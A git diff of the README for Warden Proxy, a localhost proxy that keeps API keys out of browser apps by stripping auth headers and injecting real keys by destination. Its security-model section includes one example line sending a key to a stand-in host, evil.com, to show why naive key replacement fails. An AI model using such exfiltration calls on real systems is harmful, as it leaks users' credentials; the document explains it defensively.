@@ -1,87 +1,142 @@
 # 🔒 Warden Proxy
 
-**A localhost proxy that gives browser-sandboxed applications safe, controlled access to the outside world.**
+**A localhost proxy that gives browser-sandboxed applications safe, controlled access to the outside world — transparently.**
 
 Every browser tab is a virtual machine — sandboxed, isolated, secure. But that sandbox also means browser apps can't hold API keys safely, can't talk to local devices, and can't access external services without exposing credentials in client-side code.
 
-Warden is the solution. It runs on localhost and acts as a **supervised gateway** between your browser applications and the outside world. API keys never touch the browser. External access is explicitly configured and controlled. Your AI agents, web apps, and browser-based tools get the capabilities they need without breaking the sandbox.
+Warden solves this. It runs on localhost, sits between your browser apps and the outside world, and **transparently handles authentication** so your apps never need real API keys. Your AI agents, web apps, and browser-based tools get the capabilities they need without breaking the sandbox — and without ever touching a real credential.
 
-## The Problem
+## Why Warden?
 
-Browser applications today face an impossible choice:
+The browser is becoming the universal virtual machine. WebAssembly runs code at near-native speed. Every device on earth has a browser. AI agents are increasingly running inside browser tabs.
 
-1. **Stay in the sandbox** — safe but limited. No API keys, no device access, no external services.
-2. **Use a remote server** — capable but complex. Now you need infrastructure, deployment, and your API keys transit someone else's servers.
-3. **Embed keys in client code** — convenient but catastrophic. Anyone can view source and steal your credentials.
+But browser VMs have a fundamental problem: **they can't safely hold secrets.** Any API key in client-side JavaScript is visible to anyone who opens DevTools. Browser extensions can read them. Malicious scripts can exfiltrate them.
 
-## The Solution
-
-Warden runs locally on your machine and provides:
-
-- **🔑 Secure API key management** — Keys stay on your machine, never enter browser JavaScript
-- **🌐 CORS resolution** — Proxy handles cross-origin requests transparently
-- **🔒 Allowlist-based access control** — Explicitly configure which origins can access which services
-- **🤖 AI agent supervision** — Control what browser-based AI agents can and cannot do
-- **📱 Device bridging** — Unified interface to local devices (cameras, IoT, hardware)
-- **⚡ Zero latency** — It's localhost. No network hop.
+Warden is the **trusted assistant at the door** — the browser keeps everything safely contained, and Warden carries things in and out on behalf of the sandboxed applications inside.
 
 ## How It Works
 
+### Transparent Mode (Recommended)
+
+Apps don't even know Warden exists. They use fake API keys and make normal API calls. A Service Worker silently reroutes everything through Warden, which swaps in the real credentials.
+
 ```
-┌─────────────────────────────────────────────┐
-│  Browser (The Virtual Machine)              │
-│                                             │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
-│  │  Tab 1   │  │  Tab 2   │  │  Tab 3   │  │
-│  │  AI App  │  │  Web App │  │  GIFOS   │  │
-│  └────┬─────┘  └────┬─────┘  └────┬─────┘  │
-│       │              │              │        │
-│       └──────────────┼──────────────┘        │
-│                      │                       │
-│              fetch("localhost:7400")          │
-└──────────────────────┬───────────────────────┘
-                       │
-            ┌──────────▼──────────┐
-            │   Warden Proxy      │
-            │   localhost:7400    │
-            │                     │
-            │  • Auth & API keys  │
-            │  • Access control   │
-            │  • Request logging  │
-            │  • Rate limiting    │
-            └──┬────┬────┬───┬───┘
-               │    │    │   │
-            ┌──▼┐ ┌─▼─┐ ▼  ┌▼──────┐
-            │LLM│ │API│ DB │Devices │
-            └───┘ └───┘    └───────┘
+┌──────────────────────────────────────────────────────┐
+│  Browser Tab (The Virtual Machine)                   │
+│                                                      │
+│  App code (unchanged):                               │
+│  fetch("https://api.openai.com/v1/chat/completions", │
+│    { headers: { Authorization: "Bearer sk-fake" } }) │
+│                                                      │
+│         │                                            │
+│         ▼                                            │
+│  ┌─────────────────────────────┐                     │
+│  │  Warden Service Worker      │                     │
+│  │  • Intercepts API calls     │                     │
+│  │  • Strips fake auth headers │                     │
+│  │  • Reroutes to localhost    │                     │
+│  └──────────────┬──────────────┘                     │
+└─────────────────┼────────────────────────────────────┘
+                  │
+       ┌──────────▼──────────┐
+       │   Warden Proxy      │
+       │   localhost:7400    │
+       │                     │
+       │  1. Strip ALL auth  │  ← Defense in depth
+       │  2. Match service   │  ← By destination URL
+       │  3. Inject real key │  ← From local vault
+       │  4. Check allowlist │  ← Origin-based access
+       │  5. Rate limit      │  ← Prevent runaway costs
+       │  6. Log & forward   │  ← Audit trail
+       └──┬────┬────┬───┬───┘
+          │    │    │   │
+       ┌──▼┐ ┌─▼─┐ ▼  ┌▼──────┐
+       │LLM│ │API│ DB │Devices │
+       └───┘ └───┘    └───────┘
 ```
+
+**The app thinks it's talking to OpenAI. It's actually talking to Warden. It never knows the difference.**
+
+### Direct Mode
+
+For apps built with Warden in mind, call the proxy directly:
+
+```javascript
+fetch("http://localhost:7400/proxy/openai/v1/chat/completions", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    model: "gpt-4",
+    messages: [{ role: "user", content: "Hello" }]
+  })
+});
+```
+
+No API key needed in the request. Warden injects it based on the destination service.
+
+## 🔐 Security Model
+
+Warden's security is built on one core principle: **authentication is determined by destination, never by request content.**
+
+### The Problem with Text-Based Key Injection
+
+A naive proxy might search for a fake key in the request and replace it with a real one. This is **catastrophically insecure**:
+
+```javascript
+// Malicious app sends fake key to an attacker's server
+fetch("https://evil.com/steal?key=sk-fake-1234")
+// A naive text-replacement proxy would inject the REAL key here
+// Now evil.com has your credentials
+```
+
+### How Warden Does It
+
+1. **Strip ALL auth** — Every request has its auth headers (`Authorization`, `x-api-key`, `api-key`, `cookie`) completely removed. Twice — once in the Service Worker (client-side) and again in the proxy (server-side). Defense in depth.
+
+2. **Match by destination** — Warden checks where the request is going: "This is headed to `api.openai.com`." That's a registered service.
+
+3. **Inject by identity** — The real API key is injected based solely on the destination service match. Not based on anything the app sent.
+
+4. **Allowlist enforcement** — Only registered service destinations receive key injection. A request to `evil.com` gets nothing — no key, no help, no information.
+
+**The app can put literally anything in the Authorization header** — a fake key, its grandma's phone number, the lyrics to a song. Warden doesn't care. It throws it all away and injects the real key based on where the request is going.
+
+This means a malicious or buggy app **cannot exfiltrate real credentials**, because:
+- It never sees them
+- It can't influence which key gets injected
+- It can't trick Warden into injecting keys for unauthorized destinations
 
 ## Quick Start
 
 ```bash
-# Install
-npm install -g warden-proxy
+# Clone the repo
+git clone https://github.com/nwcnwc/warden-proxy.git
+cd warden-proxy
 
 # Initialize config
-warden init
+node bin/warden.js init
 
-# Add an API key
-warden add-key openai sk-your-key-here
-
-# Allow a browser origin to use it
-warden allow http://localhost:3000 openai
+# Edit ~/.warden/config.yaml with your real API keys
+# (or set environment variables: OPENAI_API_KEY, ANTHROPIC_API_KEY, etc.)
 
 # Start the proxy
-warden start
+node bin/warden.js start
 ```
 
-Then from your browser app:
+### Transparent Mode (Service Worker)
+
+Add one script tag to your HTML — that's it:
+
+```html
+<script src="http://127.0.0.1:7400/client/warden-loader.js"></script>
+```
+
+Now every `fetch()` call to a registered API is transparently proxied through Warden. Your app code doesn't change. Your fake keys keep working. The real keys stay safe.
+
+### Direct Mode
 
 ```javascript
-// Instead of calling OpenAI directly (exposing your key):
-// fetch("https://api.openai.com/v1/chat/completions", { headers: { Authorization: "Bearer sk-..." } })
-
-// Call Warden (key injected server-side):
+// No key needed — Warden injects it
 const response = await fetch("http://localhost:7400/proxy/openai/v1/chat/completions", {
   method: "POST",
   headers: { "Content-Type": "application/json" },
@@ -92,93 +147,117 @@ const response = await fetch("http://localhost:7400/proxy/openai/v1/chat/complet
 });
 ```
 
-Warden injects the API key, forwards the request, and returns the response. Your browser code never sees the key.
-
 ## Configuration
 
-```yaml
-# ~/.warden/config.yaml
-port: 7400
-log_level: info
-
-# API keys (or use environment variables)
-keys:
-  openai:
-    header: "Authorization"
-    value: "Bearer ${OPENAI_API_KEY}"
-    base_url: "https://api.openai.com"
-  anthropic:
-    header: "x-api-key"
-    value: "${ANTHROPIC_API_KEY}"
-    base_url: "https://api.anthropic.com"
-
-# Access control - which origins can use which keys
-access:
-  - origin: "http://localhost:*"
-    allow: ["openai", "anthropic"]
-  - origin: "https://myapp.com"
-    allow: ["openai"]
-
-# Rate limiting
-limits:
-  openai:
-    rpm: 60      # requests per minute
-    rpd: 1000    # requests per day
-  anthropic:
-    rpm: 30
-
-# Device bridges (future)
-devices: {}
+```json
+// ~/.warden/config.yaml (JSON format in v0.1)
+{
+  "port": 7400,
+  "log_level": "info",
+  "keys": {
+    "openai": {
+      "header": "Authorization",
+      "value": "Bearer ${OPENAI_API_KEY}",
+      "base_url": "https://api.openai.com"
+    },
+    "anthropic": {
+      "header": "x-api-key",
+      "value": "${ANTHROPIC_API_KEY}",
+      "base_url": "https://api.anthropic.com"
+    }
+  },
+  "access": [
+    {
+      "origin": "http://localhost:*",
+      "allow": ["openai", "anthropic"]
+    }
+  ],
+  "limits": {
+    "openai": { "rpm": 60, "rpd": 1000 },
+    "anthropic": { "rpm": 30, "rpd": 500 }
+  }
+}
 ```
+
+Environment variables are interpolated: `${OPENAI_API_KEY}` is replaced with the value of `$OPENAI_API_KEY` at startup.
 
 ## Architecture
 
-Warden is built with a modular architecture:
+```
+warden-proxy/
+├── bin/warden.js          # CLI entry point
+├── src/
+│   ├── index.js           # HTTP server, request routing
+│   ├── proxy.js           # Core proxy: auth stripping, key injection, forwarding
+│   ├── cors.js            # CORS preflight and header handling
+│   ├── access.js          # Origin-based allowlist controller
+│   ├── vault.js           # API key storage and lookup
+│   ├── limiter.js         # Per-service rate limiting
+│   ├── logger.js          # Structured request logging
+│   └── client/
+│       ├── warden-sw.js   # Service Worker (runs in browser)
+│       └── warden-loader.js  # One-line script to activate SW
+├── test/
+│   ├── proxy.test.js      # Core proxy + access + rate limit tests
+│   └── security.test.js   # Auth stripping + destination-based injection tests
+└── docs/
+```
 
-- **Core proxy** — HTTP server on localhost, handles routing and CORS
-- **Key vault** — Secure storage for API keys (encrypted at rest)
-- **Access controller** — Origin-based allowlisting with wildcard support
-- **Rate limiter** — Per-service rate limiting to prevent runaway costs
-- **Request logger** — Full audit trail of what went where
-- **Device bridge** — Pluggable adapters for local device access (planned)
+### Key Components
+
+| Component | What it does |
+|-----------|-------------|
+| **Service Worker** | Runs in the browser. Intercepts fetch() calls to registered APIs. Strips auth headers. Reroutes to Warden. Apps don't know it exists. |
+| **Proxy Server** | Runs on localhost. Strips auth again (defense in depth). Matches destination to registered service. Injects real key. Forwards request. |
+| **Key Vault** | Stores API keys locally. Supports env variable interpolation. Keys never leave the machine. |
+| **Access Controller** | Origin-based allowlisting. Controls which browser origins can access which services. Wildcard support. |
+| **Rate Limiter** | Per-service request limits (per-minute, per-day). Prevents runaway costs from buggy or malicious apps. |
 
 ## Use Cases
 
-### 🤖 AI Agents in the Browser
-Build AI agents that run entirely in browser tabs. Warden gives them access to LLM APIs, search, tools — all without exposing credentials.
+### 🤖 AI Agents in Browser VMs
+Build AI agents that run entirely in browser tabs with full LLM access. The agent uses fake keys, Warden provides real access. The agent is sandboxed — it can think and create, but it can't steal credentials or access unauthorized services.
 
-### 🎨 Browser-as-VM Applications
-Any application using the browser as a computing platform can use Warden for safe external access.
+### 🌐 Browser-as-VM Applications
+Any application treating the browser as a computing platform can use Warden for safe external access — without embedding secrets in client code.
 
 ### 🔧 Local Development
-Replace scattered `.env` files and hardcoded keys with a single, secure proxy. All your local dev servers share one key store.
+Replace scattered `.env` files and hardcoded keys across projects with a single, secure key store. All your local dev servers share one Warden instance.
 
-### 📱 IoT / Device Control
-Build browser dashboards that control local hardware through Warden's device bridge.
+### 📱 Device Bridging (Planned)
+Build browser dashboards that control local hardware — cameras, IoT devices, home automation — through Warden's device bridge plugin system.
 
-## Philosophy
+## The Bigger Picture
 
-The browser is the most widely deployed, most secure application runtime in history. Warden doesn't fight the sandbox — it complements it. The browser provides isolation and security. Warden provides supervised access to the outside world.
+As AI moves toward programming in languages optimized for machines (like WebAssembly) rather than humans, and as the browser becomes the universal VM, **the need for a trusted intermediary between sandboxed code and the outside world becomes critical.**
 
-Think of it as the **orderly at the asylum door** — the browser keeps everything safely contained, and Warden is the trusted assistant who carries things in and out.
+Warden is that intermediary. The browser is the padded room. Warden is the trusted assistant who brings things to the door.
+
+Read more: [The Browser Is Already a Virtual Machine](docs/browser-as-vm.md) *(coming soon)*
 
 ## Roadmap
 
-- [x] Project setup and architecture
-- [ ] Core HTTP proxy with CORS handling
-- [ ] API key vault (encrypted storage)
-- [ ] Origin-based access control
-- [ ] CLI (`warden init`, `warden start`, `warden add-key`, `warden allow`)
-- [ ] Rate limiting
-- [ ] Request logging and audit trail
+- [x] Core HTTP proxy with service routing
+- [x] API key vault with environment variable interpolation
+- [x] Origin-based access control with wildcard support
+- [x] Per-service rate limiting (rpm/rpd)
+- [x] CORS handling for browser origins
+- [x] Transparent Service Worker intercept
+- [x] Defense-in-depth auth stripping (client + server)
+- [x] Request logging with structured output
+- [x] Security test suite
+- [ ] CLI commands: `add-key`, `remove-key`, `allow`, `deny`
+- [ ] Encrypted key storage at rest
 - [ ] WebSocket proxy support
+- [ ] Streaming response support (SSE)
 - [ ] Device bridge plugin system
-- [ ] Browser extension (optional — auto-configure origins)
+- [ ] Browser extension (alternative to Service Worker)
+- [ ] Admin dashboard (view logs, manage keys, monitor usage)
 - [ ] WASI integration (for Wasm apps outside the browser)
 
 ## Contributing
 
-This project is in early development. Issues and PRs welcome.
+This project is in early development. Issues, ideas, and PRs welcome.
 
 ## License
 
